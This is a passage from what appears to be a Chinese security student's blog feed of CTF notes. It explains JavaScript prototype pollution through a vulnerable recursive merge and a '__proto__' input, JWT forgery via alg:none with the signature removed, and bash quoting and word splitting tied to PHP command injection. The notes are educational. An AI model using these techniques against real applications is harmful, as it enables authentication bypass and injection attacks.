<code>[[Prototype]]</code>链接（即 <code>__proto__</code>）指向 Object.prototype</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的调用链</span></span><br><span class="line">obj ---&gt; <span class="title class_">Constructor</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="literal">null</span></span><br><span class="line"><span class="comment">// 可以通过调用链进行解决</span></span><br></pre></td></tr></table></figure></li><li><p>内置构造函数</p><ol><li>一些内置构造函数的 prototype 属性本身就是其自身的实例。例如，Number.prototype 是数字 0，Array.prototype 是一个空数组，RegExp.prototype 是 <code>/(?:)/</code></li><li>唯一的例外是 Object.prototype 本身，它的 <code>[[Prototype]]</code> 是 null</li></ol></li></ol><h3 id="3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗"><a href="#3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗" class="headerlink" title="*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?"></a>*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?</h3><ol><li>构造函数中prototype总是会默认有一个同对象，当你改变构造函数的 prototype 属性后，之前创建的实例和之后创建的实例将有不同的 <code>[[Prototype]]</code>。这是因为每个实例对象的 <code>[[Prototype]]</code> 在创建时就已经被设置，并且不会随着构造函数 prototype 属性的变化而变化</li><li>通过同一个构造函数构造的对象的 <code>[[Prototype]]</code> 是同一个对象。所有通过同一个构造函数创建的实例共享同一个原型对象，但是修改(这里的修改不是说添加而是指向另一个对象，<strong>地址不同</strong>)不是“同步”进行的，指向了不同的对象 -&gt; 原来的对象还可以访问，垃圾收集器不会处理</li></ol><h3 id="4-DONE-是否会造成无限循环的问题？"><a href="#4-DONE-是否会造成无限循环的问题？" class="headerlink" title="*4. DONE: 是否会造成无限循环的问题？"></a>*4. DONE: 是否会造成无限循环的问题？</h3><ol><li><p>有一种情况，如下，见注释即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">b</span>=&#123;<span class="string">&quot;AAA&quot;</span>: <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="comment">// Object有b属性，而b的原型是Object吗？在浏览器中看起来像是创建了无数个对象</span></span><br><span class="line"><span class="comment">// 但是实际上并没有</span></span><br><span class="line">   <span class="comment">// 从原型链的角度看一直是b -&gt; Object -&gt; null；a -&gt;&gt; Object -&gt; null</span></span><br><span class="line">   <span class="comment">// 从对象角度来看始终只有三个对象，一个就是b，一个就是a还有Object</span></span><br><span class="line">      <span class="comment">/*      a ——&gt; b &lt;——&gt; Object &lt;——</span></span><br><span class="line"><span class="comment">       *     |                      | </span></span><br><span class="line"><span class="comment">       *     | —— —— —— —— —— —— —— |   </span></span><br><span class="line"><span class="comment">       */</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Js原型链基础"><a href="#Js原型链基础" class="headerlink" title="Js原型链基础"></a>Js原型链基础</h2><h3 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h3><ol><li>getter和setter<ol><li>一种语法：通过调用属性的方法来隐式调用一组函数</li><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Working_with_objects#%E5%AE%9A%E4%B9%89_getter_%E4%B8%8E_setter">mdn getter和setter</a></li></ol></li><li>js原型链<ol><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">还是mdn，绝了，web手必备</a></li><li>!!! Notice 流程详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">有创建一个原型的详细流程</a></li><li>核心思想：基于对象的链而非类的链；对象方法基于this；<strong>动态实时改变的</strong></li><li>第一次看的时候被混淆的几个点<ol><li><code>someObject.[[Prototype]]</code> 用于标识 someObject 的原型 -&gt; 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 函数来访问</li><li><strong>设置<code>[[Prototype]]</code></strong>: <code>&#123; __proto__: ... &#125;</code> 语法与 <code>obj.__proto__</code> 访问器不同：前者是标准且未被弃用，后者则是被许多js引擎实现的原型setter和getter(非标准并逐步弃用)<ol><li><code>&#123; __proto__: ... &#125;</code> 是一种对象字面量语法，允许你在创建对象时指定其原型(这里不是getter和setter)。这是 ES5 引入的一个非标准特性，后来在 ES6 中被标准化为一个正式的语言特性</li></ol></li><li><strong>构造函数的.prototype属性</strong>: 构造函数可以**指定(自定义)**一个有特殊含义的属性prototype -&gt; 当你定义一个构造函数时，JavaScript 会自动为这个构造函数创建一个 prototype 对象。这个原型对象默认有一个 constructor 属性，指向构造函数本身<code>Person.prototype.constructor===Person</code><ol><li>有什么用呢？通过构造函数创建的每一个实例都会自动将构造函数的 prototype 属性作为其 <code>[[Prototype]]</code> -&gt; 是自动通过this实现的，特殊情况：如果构造函数返回非原始值而是一个新对象时，则该值将成为 new 表达式的结果。在这种情况下，<code>[[Prototype]]</code> 可能无法正确绑定——但在实践中应该很少发生</li><li><code>obj.constructor</code>:(会通过原型链寻找)的作用在于追踪到构造函数，一些内置操作也会读取 constructor 属性，如果没有设置，它们可能无法按预期工作</li></ol></li></ol></li></ol></li></ol><h3 id="类是构造函数语法糖"><a href="#类是构造函数语法糖" class="headerlink" title="类是构造函数语法糖"></a>类是构造函数语法糖</h3><ol><li>js中的类<ol><li>简单了解：可以暂时理解为类是构造函数的语法糖，这意味着你仍然可以修改 Box.prototype 来改变所有实例的行为</li></ol></li><li>Dive into<ol><li><code>alert(typeof Classname)</code>显示为function</li><li>函数转换示例<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/%E5%87%BD%E6%95%B0%E8%BD%AC%E6%8D%A2.png" alt="理解"><ol><li>转换为对于Classname()函数prototype属性的内容，<code>User.prototype.constrcutor===User</code></li></ol></li><li><a href="https://zh.javascript.info/class">see more in 现代js教程</a></li></ol></li></ol><h2 id="Js原型链污染"><a href="#Js原型链污染" class="headerlink" title="Js原型链污染"></a>Js原型链污染</h2><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><ol><li>快速上手<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">离别歌yyds</a></li></ol><h3 id="与问题3进行区分与原理解释"><a href="#与问题3进行区分与原理解释" class="headerlink" title="*与问题3进行区分与原理解释"></a>*与问题3进行区分与原理解释</h3><ol><li><p>在js中对象是通过地址进行区分的，里面的修改是指指向另一个新的对象(新的地址)，而原来的地址已经定下来而且没有被垃圾回收</p></li><li><p>原型链污染可以是建立在指向同一个原型的情况下<strong>添加属性&#x2F;函数</strong>进行污染</p></li><li><p>原型链污染示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此例子无法进行原型链污染，只能修改对象的__proto__</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">   <span class="comment">// 建立后的__proto__指向是本身的[[Prototype]]，改变了[[Prototype]]的指向</span></span><br><span class="line"><span class="keyword">let</span> o2 = &#123;&#125;</span><br><span class="line">o2.<span class="property">a</span>  <span class="comment">// 显示undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是在merge中，则可以通过对原有对象添加属性，直接修改所有prototype那个对象而不是替换指向</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// !!!总的来说，就是只能添加内容，不能整体替换指向，再本质就是要进入到对象中修改(merge中就是)</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="1-普通可控输入的原型链污染"><a href="#1-普通可控输入的原型链污染" class="headerlink" title="1. 普通可控输入的原型链污染"></a>1. 普通可控输入的原型链污染</h3><ol><li><p>示例代码</p><ol><li>污染的深度这里会受到限制，所以漏洞可否利用还要看<strong>原型是否一样</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matrix[client.<span class="property">input1</span>][client.<span class="property">input2</span>]   </span><br><span class="line"><span class="comment">// 可以传入input1=&quot;__proto__&quot;来实现污染</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Merge类型的原型链污染"><a href="#2-Merge类型的原型链污染" class="headerlink" title="2. Merge类型的原型链污染"></a>2. Merge类型的原型链污染</h3><ol><li><p>示例代码与前提</p><ol><li>json.parse()的递归不安全merge</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>为什么要json.parse()?</strong></em>: 在JavaScript中，JSON.parse()函数在处理JSON字符串时，会将JSON对象中的任何键视为任意字符串，包括<code>__proto__</code></p><ol><li>这里的<code>__proto__</code>并非是指向原型的属性，而是一个普通的自有属性(字符串)，可以被<code>getOwnProperties(&quot;__proto__&quot;)</code>和<code>hasOwnProperties(&quot;__proto__&quot;)</code>识别</li><li>过程：<code>__proto__</code> 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution</li><li>如果是<em><strong>直接<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>的话</strong></em>，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型</li><li>JSON.parse中的原型链污染<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/JSONparse%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png" alt="Json.parse"><ol><li>详见权威报告，离别歌引用文章中有和<a href="https://xz.aliyun.com/t/2802?time__1311=n4+xni0=G=DQtAK0QD/8WpjrYDOboKbDBnhoD">先知社区</a></li></ol></li></ol></li><li><p>预防</p><ol><li>只需要在merge中加上小小的一段检验后跳过即可</li></ol></li></ol><h3 id="实战指南"><a href="#实战指南" class="headerlink" title="*实战指南"></a>*实战指南</h3><ol><li>有很多相关的函数(递归合并的话)，做题时重要的是思路的方向，然后根据具体的方向去查找更加重要，<em><strong>特征</strong></em><ol><li>merge</li><li>类似js这种没有严格访问控制属性的语言</li></ol></li><li>一些可以实战时查阅的资料<ol><li>火狐收藏夹</li><li>这篇不错<a href="https://xz.aliyun.com/t/12053?time__1311=GqGxR70Qi=itKGN4eeqBInO6Kf27EbD#toc-0">关于Prototype Pollution Attack的二三事</a></li><li>有一些cve<a href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析</a></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_jwt</title>
      <link href="/2024/10/27/ctfshow_jwt/"/>
      <url>/2024/10/27/ctfshow_jwt/</url>
      
        <content type="html"><![CDATA[<h2 id="web345-alg-none"><a href="#web345-alg-none" class="headerlink" title="web345: alg: none"></a>web345: alg: none</h2><ol><li>这里就没有验证，理论来说可以随便改，主要问题在于目标目录端点问题<ol><li>***&#x2F;admin和&#x2F;admin&#x2F;***是不一样的</li></ol></li></ol><h2 id="web346-修改alg-none"><a href="#web346-修改alg-none" class="headerlink" title="web346: 修改alg: none"></a>web346: 修改alg: none</h2><ol><li>这里是修改算法为none，可以解决</li><li><strong>注意签名部分可以删掉</strong>，并且需要将sub变为admin</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从babyfirst-revengev2看bash中的字符串</title>
      <link href="/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>bash转义与换行问题<ol><li><a href="https://www.bookstack.cn/read/bash-tutorial/docs-quotation.md">阮一峰 挺好的教程</a></li></ol></li><li>其他参考资料见小部分中的如<code>无引用变量的拓展</code></li></ol><h2 id="php如何处理用户输入的字符串"><a href="#php如何处理用户输入的字符串" class="headerlink" title="php如何处理用户输入的字符串"></a>php如何处理用户输入的字符串</h2><ol><li><p>当处理用户输入的字符串(比如<code>$_GET</code>)并将其传递给系统命令时，PHP 本身不会自动为这些字符串添加引号，只是直接进行添加(什么样就放什么进去)，只有字面量才需要进行(单引号和双引号的考虑)</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// 输入?cmd=\&#x27;\&quot;&#x27;&quot;都可以正常输出</span></span><br></pre></td></tr></table></figure></li><li><p>对用户输入进行处理</p><ol><li><code>escapeshellarg()</code> 会确保 $user_input 被正确转义并用单引号包裹</li><li>需要转义整个命令字符串而不是单独的参数，可以使用 <code>escapeshellcmd()</code>。这个函数会转义可能被 shell 特别解释的字符，但不会添加引号</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line"><span class="variable">$safe_command</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$safe_command</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="bash中字符串的转义-无引号和单引号与双引号"><a href="#bash中字符串的转义-无引号和单引号与双引号" class="headerlink" title="bash中字符串的转义(无引号和单引号与双引号)"></a>bash中字符串的转义(无引号和单引号与双引号)</h2><ol><li><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E8%BD%AC%E4%B9%89%E5%8C%BA%E5%88%AB.png" alt="先上图"><ol><li>Bash 只有一种数据类型，就是字符串。不管用户输入什么数据，Bash 都视为字符串</li><li><em><strong>单引号只有一个意外，那就是&#39;</strong></em>: 单引号用于保留字符的字面含义，各种特殊字符在单引号里面，都会变为普通字符，比如星号（*）、美元符号（$）、反斜杠（\）等</li><li><em><strong>双引号</strong></em>: 双引号比单引号宽松，可以保留大部分特殊字符的本来含义，但是三个字符除外：美元符号（$）、反引号（&#96; ）和反斜杠（\）。也就是说，这三个字符在双引号之中，会被 Bash 自动扩展<ol><li>*号等通配符会原样进行输出</li><li>灵活性主要用于变量替换</li><li><strong>可以保持原有格式输出 -&gt; 不加双引号再echo中会丢失，在echo配合重定向中会出事(</strong><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%BF%9D%E6%8C%81%E6%A0%BC%E5%BC%8F.png" alt="bash中双引号保持格式"></li></ol></li></ol></li><li><em><strong>不使用引号的字符串</strong></em> –&gt; 更加详细要去到<strong>无引用变量的拓展</strong>这个标题处<ol><li>以<code>echo hello world</code>为例<ol><li>先上图<img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E6%B2%A1%E6%9C%89%E5%BC%95%E5%8F%B7%E7%9A%84echo.png" alt="echo字符串图"></li><li>无引号：当你不使用引号时，echo 命令会将每个单词视为一个单独的参数</li><li>双引号：当你使用双引号时，整个字符串被当作一个单一的参数传递给 echo</li></ol></li><li><strong>总结</strong>: 无引号字符串：Bash 会将字符串中的空格作为分隔符，并且会解释特殊字符和通配符 –&gt; 与双引号不同的是<code>cat *.txt</code>会进行通配符匹配，即会解析*</li><li>示例解读</li></ol></li></ol><h2 id="bash中的多行命令-部分"><a href="#bash中的多行命令-部分" class="headerlink" title="bash中的多行命令(部分)"></a>bash中的多行命令(部分)</h2><ol><li><em><strong>引号</strong></em>: 单双引号中的字符串字面量本身就可以多行输入和显示 -&gt; 不需要使用\来进行换行了<ol><li>本质: 换行符变成了普通字符而不能发挥作用</li></ol></li><li><em><strong>反斜杠\</strong></em>: 规则如下<ol><li><p>反斜杠 \ 放在一行的末尾，表示该行的结束不是命令的结束，而是继续到下一行</p><ol><li><strong>要搭配换行符使用才行</strong>: 最后一个反斜杠：如果一行以反斜杠 \ 结束，并且后面没有任何字符（包括空格），那么这个反斜杠会被视为普通字符，而不是续行符；后续有字符但是不是换行符也不会有换行作用</li></ol><blockquote><p>接下来这两个不太确定，ai说的但是实践出来不是<br>反斜杠 \ <strong>后面的所有空格都会被忽略</strong>。这意味着你可以使用多个空格或制表符来格式化代码，而不会影响命令的实际内容<br>如果反斜杠 \ 后面跟着的是注释符号 #，那么<strong>注释部分会被忽略</strong>，但反斜杠仍然会作为续行符</p></blockquote></li><li><p>当使用<code>bash -c</code>执行命令时，反斜杠 \ 也可以作为续行符在脚本文件中，反斜杠 \ 也可以用来将长命令拆分成多行</p></li><li><p>在脚本文件中，反斜杠 \ 也可以用来将长命令拆分多行</p></li></ol></li><li>还有here string和here doc的等其他篇吧，不要跑题太多了</li></ol><h2 id="Back-to-babyfirst-revengev2"><a href="#Back-to-babyfirst-revengev2" class="headerlink" title="Back to babyfirst-revengev2"></a>Back to babyfirst-revengev2</h2><h3 id="我的困惑"><a href="#我的困惑" class="headerlink" title="我的困惑"></a>我的困惑</h3><ol><li>Q: php命令执行会按照传入的command的引号吗，还是在bash层面进行处理</li><li>A: 已知php中底层的执行函数为<code>/bin/sh -c $command</code>(详见<code>phpm命令执行底层原理小记</code>)，<strong>调用链从近到远进行入手</strong><ol><li>Q: 此时与传入的<code>$command</code>有很大的关系，&#x2F;bin&#x2F;sh如何解释无引号字符?</li><li>A: slpit+glob，传入的命令中没有空格<code>$IFS</code>的话就是正常的<ol><li>Q: 那在<code>. _</code>调用脚本如何解释呢</li><li>A: php中直接作为输入导致，<strong>字符已经确定为一个整体</strong>，单引号和双引号只是解析的方式</li></ol></li><li><code>$command</code>是php传入的，php从用户的输入<code>$_GET[&#39;cmd&#39;]</code>处获取信息<ol><li>Q: php中判断是单引号还是双引号字符串<ol><li>从$_GET[]</li><li>用户输入获取的呢</li></ol></li><li>A: 直接作为输入，不管单双引号</li></ol></li></ol></li><li>理解<ol><li>!!! Notice 其实双引号和单引号是<strong>解析字符串的方式</strong>，存储在内部是不管引号的，去想象实际的字符</li><li>包括glob拓展后的列表</li></ol></li></ol><h3 id="无引用变量的拓展"><a href="#无引用变量的拓展" class="headerlink" title="*无引用变量的拓展"></a>*无引用变量的拓展</h3><ol><li>split and glob的概念<ol><li>ref<ol><li><a href="https://unix.stackexchange.com/questions/108963/expansion-of-a-shell-variable-and-effect-of-glob-and-split-on-it">stack exchange ref</a> –&gt; 有例子有概念，很不错</li><li><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion">gnu 官方文档</a><ol><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Filename-Expansion">拓展</a></li><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Word-Splitting">split</a></li></ol></li><li><em><strong>利用此特性的漏洞利用</strong></em><a href="https://medium.com/@bouss3id.abdelkader/unquoted-bash-variable-security-implications-bypassing-if-condition-in-bash-ctf-write-up-79648dc4e910">利用此特性的漏洞利用</a></li></ol></li><li>split: 在每个空格序列处将值拆分为单独的单词。(根据$IFS，可以更改为在非空格的字符处拆分。)因此，结果不再是一个字符串，而是一个<strong>字符串列表</strong>。如果值只包含空格，则此列表可以为空</li><li>glob: 将列表中的每个元素视为一个文件名模式，即一个glob。如果模式与某些文件匹配，则将其替换为匹配文件名的列表，否则将其保留 –&gt; 会进行glob匹配</li></ol></li><li>无引用变量<ol><li><p><code>cmd $var</code> -&gt; <code>cmd(glob(split($var)))</code>后面是一个列表</p></li><li><p><code>/bin/sh -c $cmd</code>也是按照上述的方式，<code>$IFS</code>中的值很重要</p><ol><li><strong>output $IFS in readable way</strong>: IFS的默认值是由空格、制表符和换行符组成的三个字符串<ol><li><code>echo &quot;$IFS&quot; | cat -et</code>(这里需要加上双引号)才会正常，直接$IFS不太行</li><li><code>echo &quot;$IFS&quot; | xxd</code>可以查看16进制</li></ol></li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="built_in">echo</span>\ <span class="built_in">test</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 无法正常运行</span></span><br><span class="line"><span class="variable">$IFS</span>= <span class="comment"># 这里是空格</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 可以正常运行，输出test</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="在bash-POSIX-shell中忘记引用变量的安全性影响"><a href="#在bash-POSIX-shell中忘记引用变量的安全性影响" class="headerlink" title="***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响"></a>***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响</h3><ol><li>Stack Exchange高关注议题<a href="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells">Security implications of forgetting to quote a variable in bash&#x2F;POSIX shells</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言自学指南(2024持续更新)</title>
      <link href="/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/"/>
      <url>/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>中国油锯古瓦，自学才是效率最高的学习  </p><hr><ol><li>这里总结一下我搜集的各种资源(无视频)，其中有些也没看完&#x2F;只是浅浅过一遍  </li><li>同时，语言是不断发展的，这是2024年搜集到的(并不是2024年的)<br>总而言之：翻到这篇资源的伙伴请睁大你的眼睛</li></ol></blockquote><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><ol><li><a href="https://www.gnu.org/software/bash/manual/bash.html">gnu bash 2022官方</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/04/bash-tutorial.html">阮一峰</a></li><li><a href="https://tldp.org/LDP/abs/html/">Advanced Bash-Scripting Guide en</a></li><li><a href="https://www.shellscript.sh/">shell script</a></li><li><a href="https://www.shellscript.sh/">命令行的艺术</a></li></ol><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><ol><li><a href="https://zh.javascript.info/">js现代教程 真神</a></li><li><a href="https://nodejs.org/en/learn/getting-started/introduction-to-nodejs">node.js</a></li><li><a href="https://expressjs.com/">express.js</a></li><li><a href="https://vuejs.org/guide/introduction.html">vue3 有中文版</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行底层原理的小记</title>
      <link href="/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>起源来自hitcon 2017 babyfirst-revenge和babyfirst-revengev2中关于转义\处理的问题，折腾我一个晚上(生气) -&gt; 最后感谢v1nd大哥</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>php命令执行底层原理<ol><li><a href="https://qftm.github.io/2020/12/01/command-execution-research-php/">其实看这篇就好了，只是自己总结一下，没有太考虑阅读感受(比较精简)</a></li><li><a href="https://xz.aliyun.com/t/6542?time__1311=n4+xnD0Dg7G=74xBkbDyDmrEDuGDBlOcGOYrYD">命令执行成因小注</a></li><li><a href="https://zhuanlan.zhihu.com/p/339071601">知乎安全客，像是第一篇的转载</a></li></ol></li></ol><h2 id="Linux下的命令执行"><a href="#Linux下的命令执行" class="headerlink" title="Linux下的命令执行"></a>Linux下的命令执行</h2><ol><li>分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>通过<code>type echo</code>和<code>which whoami</code>可以知道，可以通过<code>enable</code>和<code>help</code>来查看内建指令<ol><li>其中<code>/bin</code>是一个指向<code>/usr/bin</code>的链接文件噢</li></ol></li><li><em><strong>Difference</strong></em><ol><li>shell会查找command是否为built-in command类型，对于built-in command指令类型，shell会自己解释执行，而无需fork一个child process子进程来执行该command指令；</li><li>对于，不是built-in command指令类型，shell会从环境变量中按顺序搜索该command指令，如果能查到则会fork一个child process子进程来执行该command指令；然而，对于找不到的command指令，一般为：执行的指令不存在、指令未加入到环境变量中</li></ol></li></ol></li></ol><h2 id="Windows下的命令执行"><a href="#Windows下的命令执行" class="headerlink" title="Windows下的命令执行"></a>Windows下的命令执行</h2><ol><li>同linux一样，分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>使用<code>where cd</code>或者<code>set path=</code>后使得path&#x3D;(null)来调用命令共两种方法可以进行区分<ol><li>where中显示找不到但是可以执行的命令为内建命令，找得到的都是非内建的</li><li><code>set path=</code>后可以执行的为内建命令，不可以执行的是外部命令</li><li>无法使用<code>help</code>命令(本生是外键)，会把所有内+外都列出来</li></ol></li></ol></li><li>差异也是会不会开子进程的情况</li></ol><h2 id="Sytem-Execution-Func-in-different-lang"><a href="#Sytem-Execution-Func-in-different-lang" class="headerlink" title="Sytem Execution Func in different lang"></a>Sytem Execution Func in different lang</h2><blockquote><p>命令执行函数执行分为两类，一类：传入的命令仅仅作为可执行终端中的命令执行；另一类：传入的命令仅仅是运行传入的命令中的可执行程序。对象不同，一类：是底层语言系统终端帮我们执行传入的命令；另一类：是自己启动传入的可执行程序。</p></blockquote><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><ol><li>linux和windows都有追踪<em><strong>程序流的工具</strong></em><ol><li>linux: strace</li><li>windows: OD动态调试，微软官方提供的Process 